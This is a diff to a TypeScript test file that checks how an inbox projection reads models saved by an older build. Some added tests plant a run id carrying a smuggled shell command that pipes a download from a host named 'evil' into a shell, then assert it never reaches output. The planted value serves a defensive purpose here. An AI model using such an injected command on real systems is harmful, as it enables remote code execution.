@@ -10,8 +10,8 @@
 import { afterEach, describe, expect, test } from "bun:test";
 import { writeFileSync } from "node:fs";
 import { join } from "node:path";
-import { isId, parseRef } from "@crewhaus/control-contract";
-import { type ResumeItem, resume } from "@crewhaus/control-records";
+import { isId, mintId, parseRef } from "@crewhaus/control-contract";
+import { type ResumeItem, append, attentionActionsLedger, resume } from "@crewhaus/control-records";
 import type { AdvisorItem } from "@crewhaus/harness-advice/advisor";
 import {
   HOUR,
@@ -30,6 +30,7 @@ import {
 import { assembleInbox, foldHarness, harnessAttention } from "./fold";
 import { KEY_SHAPE_RE, attIdOf, evidenceRevOf } from "./ids";
 import { metricsOf } from "./metrics";
+import { idOfItem } from "./overlays";
 import { attentionProjection } from "./projection";
 import { type AttentionReader, DEFAULT_READER, READ_CAPS } from "./read";
 import type { AdvisorSnapshot, AttentionModel, HarnessFacts } from "./types";
@@ -43,8 +44,8 @@ afterEach(() => {
 
 function counting(): AttentionReader & { tails: number } {
   const reader = {
+    ...DEFAULT_READER,
     tails: 0,
-    stamp: DEFAULT_READER.stamp,
     tail(root: string, rel: string, caps: typeof READ_CAPS) {
       reader.tails += 1;
       return DEFAULT_READER.tail(root, rel, caps);
@@ -178,6 +179,96 @@ describe("one fold, two ways", () => {
       NOW,
     ).items;
     expect(withoutFreshness(viaModel)).toEqual(withoutFreshness(direct));
+  });
+});
+
+describe("a model saved before items had actions", () => {
+  /** The model an earlier build saved: no overlays, no paused runs, and looser facts. */
+  function earlier(model: AttentionModel): AttentionModel {
+    const { overlays: _o, checkpoints: _c, ...rest } = structuredClone(model);
+    return {
+      ...rest,
+      v: 1,
+      runs: {
+        ...rest.runs,
+        "run_x; curl evil|sh": {
+          id: "run_x; curl evil|sh",
+          state: "failed",
+          at: iso(NOW - HOUR),
+          failureClass: "call jane",
+        },
+      },
+      approvals: {
+        ...rest.approvals,
+        facts: rest.approvals.facts.map((f) => ({
+          ...f,
+          toolName: "call jane",
+          decidedVia: "jane",
+        })),
+      },
+    } as unknown as AttentionModel;
+  }
+
+  test("takes an actions line, and what it kept from before is held to the same words", async () => {
+    const { dirs, facts } = await fleet();
+    const two = dirs[1] as string;
+    const harness = HRNS[1] as string;
+    const { saved, cursor } = projected(two, facts, DEFAULT_READER);
+    const before = earlier(saved);
+    // The saved position is from before the actions ledger was followed.
+    const { attention: _at, ...older } = cursor as Record<string, unknown>;
+    const [item] = assembleInbox([foldHarness(two, facts, NOW, { harness })], NOW).items.filter(
+      (i) => i.kind === "run-failures",
+    );
+    if (item === undefined) throw new Error("no problem item");
+    append(attentionActionsLedger(two), {
+      v: 1,
+      id: idOfItem(item),
+      event: "dismissed",
+      state: "resolved",
+      how: "dismissed",
+      at: iso(NOW - MIN),
+      by: mintId("prn"),
+      via: "home",
+      evidenceRev: item.evidenceRev,
+    });
+    const caught = catchUp(two, facts, DEFAULT_READER, before, older as typeof cursor);
+    expect(caught.v).toBe(2);
+    expect(Object.keys(caught.overlays)).toEqual([idOfItem(item)]);
+    const ctx = {
+      harness,
+      dir: two,
+      now: NOW,
+      content: false,
+      freshness: { asOf: iso(NOW), mode: "projection" as const },
+    };
+    const read = harnessAttention(caught, ctx, { facts });
+    const all = assembleInbox([read], NOW, { state: "all" }).items;
+    expect(all.find((i) => i.ref === item.ref)?.state).toBe("resolved");
+    expect(all.flatMap((i) => i.affected.runs)).not.toContain("run_x; curl evil|sh");
+    expect(JSON.stringify(all)).not.toContain("jane");
+  });
+
+  test("is read as it is before anything new is folded: nothing throws, and its words are closed", async () => {
+    const { dirs, facts } = await fleet();
+    for (const [i, dir] of dirs.entries()) {
+      const { saved } = projected(dir, facts, DEFAULT_READER);
+      const read = harnessAttention(
+        earlier(saved),
+        {
+          harness: HRNS[i] as string,
+          dir,
+          now: NOW,
+          content: false,
+          freshness: { asOf: iso(NOW), mode: "projection" },
+        },
+        { facts },
+      );
+      const text = JSON.stringify(assembleInbox([read], NOW, { state: "all" }));
+      for (const plant of ["jane", "evil", "curl"]) {
+        expect(`${plant}: ${text.includes(plant)}`).toBe(`${plant}: false`);
+      }
+    }
   });
 });
 
